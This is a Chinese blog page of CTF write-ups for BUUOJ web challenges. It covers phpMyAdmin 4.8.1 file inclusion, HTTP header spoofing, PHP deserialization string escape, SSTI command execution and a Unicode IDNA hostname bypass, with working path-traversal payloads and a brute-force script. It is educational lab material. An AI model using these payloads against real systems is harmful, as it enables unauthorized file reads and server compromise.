<p>看到个phpMyAdmin的版本，所以百度一下这个版本的漏洞。<br>参考：<br><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd" target="_blank" rel="noopener" title="phpmyadmin4.8.1后台getshell ">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd</a><br><a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener" title="cve-2018-12613-PhpMyadmin后台文件包含">https://www.jianshu.com/p/fb9c2ae16d09</a></p>
<p>构造payload:</p>
<pre><code>index.php?target=db_datadict.php%253f/../../../../../../../../flag</code></pre><p>即可获得flag。</p>
<h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p>进去发现是一个登录界面，使用admin登录会提示不是admin，除了admin以外的账号都能登录，登录进去也没看到什么，于是在登录时抓包分析。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzw7kh2ij30eg05k0sr.jpg" alt=""></p>
<p>发现题目的提示。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzz6wfooj31ar0e60ti.jpg" alt=""><br>进去刷新一下页面就变成这样了，于是抓包分析。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw00ja2x4j30vw0eata4.jpg" alt=""><br>看到有时间，修改时间为很大的值，显示要来自localhost才行。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giw03mnmyuj30yb0c7jsh.jpg" alt=""><br>发现X-Forwarded-For被检测到了，百度一下知道了另一个方法。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw05ieajnj30xh0czmya.jpg" alt=""><br>使用Client-ip。提示要来自gem-love.com。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw08ltjaaj30x90bzjsg.jpg" alt=""><br>用Referer绕过。接着提示需要Commodo 64浏览器。但是直接修改User-Agent为Commodo 64。现在不对，查了一下全称是Commodore 64。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0d90k2ij30x80e43zz.jpg" alt=""><br>需要我们的邮箱是：<a href="mailto:root@gem-love.com">root@gem-love.com</a>。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0ehexn7j30y80bz0ty.jpg" alt=""><br>使用From。发现又需要代理服务地址是y1ng.vip。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw0gqcbmhj30xy0cadh5.jpg" alt=""><br>使用via。从而获得flag。</p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>尝试注入，发现并不行，所以觉得应该不是SQL注入，利用dirsearch扫描。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw19f319qj30ai04kt8r.jpg" alt=""><br>发现页面备份文件<a href="http://www.zip。" target="_blank" rel="noopener">www.zip。</a><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw1ma6qwaj30lx09ejrz.jpg" alt=""><br>下载后即可看到题目的源码。</p>
<p>update.php</p>
<pre><code>&lt;?php
    require_once(&apos;class.php&apos;);
    if($_SESSION[&apos;username&apos;] == null) {
        die(&apos;Login First&apos;);    
    }
    if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) {

        $username = $_SESSION[&apos;username&apos;];
        if(!preg_match(&apos;/^\d{11}$/&apos;, $_POST[&apos;phone&apos;]))
            die(&apos;Invalid phone&apos;);

        if(!preg_match(&apos;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&apos;, $_POST[&apos;email&apos;]))
            die(&apos;Invalid email&apos;);

        if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)
            die(&apos;Invalid nickname&apos;);

        $file = $_FILES[&apos;photo&apos;];
        if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)
            die(&apos;Photo size error&apos;);

        move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));
        $profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];
        $profile[&apos;email&apos;] = $_POST[&apos;email&apos;];
        $profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];
        $profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);

        $user-&gt;update_profile($username, serialize($profile));
        echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;
    }
    else {
?&gt;</code></pre><p>通过正则匹配来过滤我们提交的数据，判断nickname这里判断了nickname是否为字符以及长度是否超过10，这里如果传入的nickname是一个数组，则可以绕过长度的限制。代码最后调用了update_profile函数，应该是把$user放进数据库里面。</p>
<p>class.php</p>
<pre><code>&lt;?php
require(&apos;config.php&apos;);

class user extends mysql{
    private $table = &apos;users&apos;;

    public function is_exists($username) {
        $username = parent::filter($username);

        $where = &quot;username = &apos;$username&apos;&quot;;
        return parent::select($this-&gt;table, $where);
    }
    public function register($username, $password) {
        $username = parent::filter($username);
        $password = parent::filter($password);

        $key_list = Array(&apos;username&apos;, &apos;password&apos;);
        $value_list = Array($username, md5($password));
        return parent::insert($this-&gt;table, $key_list, $value_list);
    }
    public function login($username, $password) {
        $username = parent::filter($username);
        $password = parent::filter($password);

        $where = &quot;username = &apos;$username&apos;&quot;;
        $object = parent::select($this-&gt;table, $where);
        if ($object &amp;&amp; $object-&gt;password === md5($password)) {
            return true;
        } else {
            return false;
        }
    }
    public function show_profile($username) {
        $username = parent::filter($username);

        $where = &quot;username = &apos;$username&apos;&quot;;
        $object = parent::select($this-&gt;table, $where);
        return $object-&gt;profile;
    }
    public function update_profile($username, $new_profile) {
        $username = parent::filter($username);
        $new_profile = parent::filter($new_profile);

        $where = &quot;username = &apos;$username&apos;&quot;;
        return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);
    }
    public function __tostring() {
        return __class__;
    }
}

class mysql {
    private $link = null;

    public function connect($config) {
        $this-&gt;link = mysql_connect(
            $config[&apos;hostname&apos;],
            $config[&apos;username&apos;], 
            $config[&apos;password&apos;]
        );
        mysql_select_db($config[&apos;database&apos;]);
        mysql_query(&quot;SET sql_mode=&apos;strict_all_tables&apos;&quot;);

        return $this-&gt;link;
    }

    public function select($table, $where, $ret = &apos;*&apos;) {
        $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;
        $result = mysql_query($sql, $this-&gt;link);
        return mysql_fetch_object($result);
    }

    public function insert($table, $key_list, $value_list) {
        $key = implode(&apos;,&apos;, $key_list);
        $value = &apos;\&apos;&apos; . implode(&apos;\&apos;,\&apos;&apos;, $value_list) . &apos;\&apos;&apos;; 
        $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;
        return mysql_query($sql);
    }

    public function update($table, $key, $value, $where) {
        $sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;
        return mysql_query($sql);
    }

    public function filter($string) {
        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);
        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;
        $string = preg_replace($escape, &apos;_&apos;, $string);

        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);
        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;
        return preg_replace($safe, &apos;hacker&apos;, $string);
    }
    public function __tostring() {
        return __class__;
    }
}
session_start();
$user = new user();
$user-&gt;connect($config);</code></pre><p>在class.php中可以看到update_profile()的方法。</p>
<pre><code>public function update_profile($username, $new_profile) {
        $username = parent::filter($username);
        $new_profile = parent::filter($new_profile);

        $where = &quot;username = &apos;$username&apos;&quot;;
        return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);
    }</code></pre><p>update_profile()中使用了mysql类中的filter()函数和update()函数。</p>
<p>filter()</p>
<pre><code>public function filter($string) {
        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);
        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;
        $string = preg_replace($escape, &apos;_&apos;, $string);

        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);
        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;
        return preg_replace($safe, &apos;hacker&apos;, $string);
    }</code></pre><p>update()</p>
<pre><code>public function update($table, $key, $value, $where) {
        $sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;
        return mysql_query($sql);
    }</code></pre><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw4n6ec6nj30l70ctjrw.jpg" alt=""><br>所以update.php就是对输入的参数进行过滤，然后序列化，将序列化的字符中的’和\替换为_，将select，insert，update，delete和where替换为hacker。</p>
<p>profile.php</p>
<pre><code>&lt;?php
    require_once(&apos;class.php&apos;);
    if($_SESSION[&apos;username&apos;] == null) {
        die(&apos;Login First&apos;);    
    }
    $username = $_SESSION[&apos;username&apos;];
    $profile=$user-&gt;show_profile($username);
    if($profile  == null) {
        header(&apos;Location: update.php&apos;);
    }
    else {
        $profile = unserialize($profile);
        $phone = $profile[&apos;phone&apos;];
        $email = $profile[&apos;email&apos;];
        $nickname = $profile[&apos;nickname&apos;];
        $photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));
?&gt;</code></pre><p>这里将信息反序列化，还会读取上传的文件。</p>
<p>config.php</p>
<pre><code>&lt;?php
    $config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;
    $config[&apos;username&apos;] = &apos;root&apos;;
    $config[&apos;password&apos;] = &apos;&apos;;
    $config[&apos;database&apos;] = &apos;&apos;;
    $flag = &apos;&apos;;
?&gt;</code></pre><p>很明显。flag是在config.php中，所以我们要构造包含config.php的数据，利用字符串逃逸。</p>
<p>反序化是以”;}结束的，我们可以把”;}加到需要反序化的字符中，就可以提前结束;}之后的内容。而update.php将参数序列化，序列化的字符和长度不可控，但是我们可以利用class.php中的filter()函数。</p>
<pre><code>public function filter($string) {
        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);
        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;
        $string = preg_replace($escape, &apos;_&apos;, $string);

        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);
        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;
        return preg_replace($safe, &apos;hacker&apos;, $string);
    }</code></pre><p>这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，<br>因为where是5个字符，而hacker是6个字符。因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。</p>
<p>我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个字符串的长度是34位，所以需要构造34个where，当替换成hacker时就会多出34位将插入的字符挤出去，这样插入的字符就不是nickname的值，从而将photo的值修改为config.php，最后就会执行file_get_content(config.php)命令从而获得flag。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw64s1xwsj30yq0i0go2.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw651g7b6j30yn0getbo.jpg" alt=""><br>最后在profile.php获得flag。<br>参考:<a href="https://www.cnblogs.com/g0udan/p/12216207.html" target="_blank" rel="noopener">https://www.cnblogs.com/g0udan/p/12216207.html</a></p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>题目提示ip，所以想到X-Forwarded-For。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giw9diu7wsj310s0cxt9s.jpg" alt=""><br>修改X-Forwarded-For发现题目显示的ip值也改变了，说明是可控的。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw9g518nij30wl0cvdgv.jpg" alt=""><br>经测试发现存在ssti注入漏洞。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giw9hc2xetj30t50c0aam.jpg" alt=""><br>执行命令，在根目录下发现flag。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw9i7crb0j310409kjs5.jpg" alt=""><br>使用cat /flag获得flag。</p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giwacezpdej315f0mlqdq.jpg" alt=""><br>出自2019blackhat的议题</p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<pre><code>@app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
def getUrl():
    url = request.args.get(&quot;url&quot;)
    host = parse.urlparse(url).hostname
    if host == &apos;suctf.cc&apos;:
        return &quot;我扌 your problem? 111&quot;
    parts = list(urlsplit(url))
    host = parts[1]
    if host == &apos;suctf.cc&apos;:
           return &quot;我扌 your problem? 222 &quot; + host
    newhost = []
    for h in host.split(&apos;.&apos;):
           newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))
    parts[1] = &apos;.&apos;.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]
    host = parse.urlparse(finalUrl).hostname
    if host == &apos;suctf.cc&apos;:
        return urllib.request.urlopen(finalUrl).read()
    else:
        return &quot;我扌 your problem? 333&quot;</code></pre><p>题目源码，其中三个if判断语句条件都是一样的，但是每一个host的构造都是不一样的。</p>
<p>当URL 中出现一些特殊字符的时候，输出的结果可能不在预期</p>
<p>所以g按照etUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句</p>
<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
for x in range(65536):
uni=chr(x)
url=&quot;http://suctf.c{}&quot;.format(uni)
try:
if getUrl(url):
print(&quot;str: &quot;+uni+&apos; unicode: \\u&apos;+str(hex(x))[2:])
except:
pass

def getUrl(url):
url=url
host=parse.urlparse(url).hostname
if host == &apos;suctf.cc&apos;:
return False
parts=list(urlsplit(url))
host=parts[1]
if host == &apos;suctf.cc&apos;:
return False
newhost=[]
for h in host.split(&apos;.&apos;):
newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))
parts[1]=&apos;.&apos;.join(newhost)
finalUrl=urlunsplit(parts).split(&apos; &apos;)[0]
host=parse.urlparse(finalUrl).hostname
if host == &apos;suctf.cc&apos;:
return True
else:
return False


if __name__==&apos;__main__&apos;:
get_unicode()</code></pre><p>脚本是参考下方博客的。</p>
<p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwb2h6cqpj30f907q3yr.jpg" alt=""></p>
<p>只需要其中任意一个就能读取文件了。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giwb87ii64j31f50jsabj.jpg" alt=""><br>题目提示我们是nginx，所以我们去读取nginx的配置文件，题目就提示了flag的位置。<br>构造payload:getUrl?url=file://suctf.cℂ/../../../../..//usr/fffffflag即可获得flag。</p>
<p>参考：<a href="https://www.cnblogs.com/Cl0ud/p/12187204.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12187204.html</a></p>

      <blockquote class="mdui-m-t-5">
        
        <strong>本文链接：</strong><a href="https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/">https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/</a>
      </blockquote>
      
    </div>
    <footer class="mdui-card-actions">
      
        <a class="mdui-ripple article_categories-link" href="/categories/web/">web</a>
      
      
        <a class="mdui-ripple article_tags-link" href="/tags/buuoj/" rel="tag">buuoj</a>
      
    </footer>
    
  </article>
  
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>

  <script>$("#main article .mdui-card-content img.fancybox").on("click",function(e){$.fancybox.open({src:$(this).attr("src")});});</script>


  <nav id="paginator">
    
      <a rel="prev" class="extend prev" href="/2020/06/09/CUMTCTF-web/">
        <button aria-label="prev" class="mdui-btn mdui-btn-raised mdui-btn-dense mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_back</i></button>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上一篇
      </a>
    
    <div class="spacer"></div>
    
  </nav>




<!-- 来必力City版安装代码 -->
<div id="lv-container" data-id="city" data-uid="MTAyMC81MTU2OC8yODA0OQ==">
<script type="text/javascript">
   (function(d, s) {
       var j, e = d.getElementsByTagName(s)[0];

       if (typeof LivereTower === 'function') { return; }

       j = d.createElement(s);
       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
       j.async = true;

       e.parentNode.insertBefore(j, e);
   })(document, 'script');
</script>
<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
</div>
<!-- City版安装代码已完成 --></main>
  <footer id="footer" class="mdui-m-t-5 mdui-p-y-3 mdui-color-theme">
  <div class="mdui-p-y-0 mdui-text-center">
    
    
    
    
    
    
    
    
    
    
    
    
  </div>
  <div class="mdui-p-y-1 mdui-text-center">
    Copyright &copy; 2019 - 2020 灬魔龙<br>
    Powered by <a href="https://hexo.io/" target="_blank" class="mdui-text-color-theme-accent">Hexo</a>
    
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_site_pv">
                本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv" style='display:none'>
                本站访客数<span id="busuanzi_value_site_uv"></span>人
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  
  </div>
</footer>
  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-theme-accent"><i class="mdui-icon material-icons">arrow_upward</i></button>
  
  
<script src="/js/mdui.js"></script>
<script src="/js/script.js"></script>

</body>
</html>